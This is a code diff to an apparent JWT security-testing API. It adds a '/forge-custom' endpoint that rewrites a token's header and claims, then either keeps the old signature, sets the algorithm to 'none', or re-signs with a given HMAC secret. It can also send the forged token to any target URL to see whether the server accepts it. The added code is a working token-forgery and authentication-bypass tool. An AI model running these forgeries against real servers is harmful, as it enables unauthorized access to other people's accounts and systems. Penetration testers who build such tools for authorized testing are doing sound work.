@@ -12,7 +12,7 @@ import httpx
 from fastapi import APIRouter
 from fastapi.responses import JSONResponse
 from pydantic import BaseModel
-from typing import Optional
+from typing import Literal, Optional
 
 router = APIRouter(prefix="/api/jwt", tags=["jwt"])
 
@@ -374,6 +374,19 @@ class RequestScanRequest(BaseModel):
     wordlist: list[str] = []
     public_key: str = ""
 
+
+class CustomForgeRequest(BaseModel):
+    token: str
+    header: dict
+    payload: dict
+    signing_mode: Literal["keep_signature", "none", "hmac"] = "keep_signature"
+    algorithm: Literal["HS256", "HS384", "HS512"] = "HS256"
+    secret: str = ""
+    target_url: str = ""
+    header_name: str = "Authorization"
+    header_value_template: str = "Bearer {token}"
+    extra_headers: dict = {}
+
 # ── endpoints ────────────────────────────────────────────────────────────────
 
 @router.get("/attack-meta")
@@ -569,6 +582,50 @@ async def decode_jwt(req: DecodeRequest):
         }
     except Exception as e:
         return {"error": str(e)}
+
+
+@router.post("/forge-custom")
+async def forge_custom(req: CustomForgeRequest):
+    """Re-encode arbitrary JWT JSON and optionally sign/probe it."""
+    try:
+        _, _, parts = _decode_parts(req.token)
+    except Exception as exc:
+        return {"error": str(exc)}
+
+    if not isinstance(req.header, dict) or not isinstance(req.payload, dict):
+        return {"error": "Header and payload must be JSON objects"}
+
+    header = dict(req.header)
+    payload = dict(req.payload)
+    if req.signing_mode == "keep_signature":
+        encoded_header = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
+        encoded_payload = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
+        forged = f"{encoded_header}.{encoded_payload}.{parts[2]}"
+    elif req.signing_mode == "none":
+        header["alg"] = "none"
+        forged = _forge(header, payload)
+    else:
+        if not req.secret:
+            return {"error": "Enter the HMAC secret to sign this token"}
+        header["alg"] = req.algorithm
+        forged = _forge(header, payload, req.secret.encode())
+
+    probe = None
+    if req.target_url:
+        template = req.header_value_template or "{token}"
+        value = template.replace("{token}", forged)
+        headers = {**req.extra_headers, req.header_name: value}
+        probe = await _send_request("GET", req.target_url, headers, "", req.target_url.startswith("https://"))
+
+    return {
+        "token": forged,
+        "header": header,
+        "payload": payload,
+        "signing_mode": req.signing_mode,
+        "probe": probe,
+        "warning": "Keeping the original signature produces an invalid token unless the server skips signature verification."
+        if req.signing_mode == "keep_signature" else None,
+    }
 
 
 def _get_applicable_attacks(header: dict, payload: dict) -> list[str]:
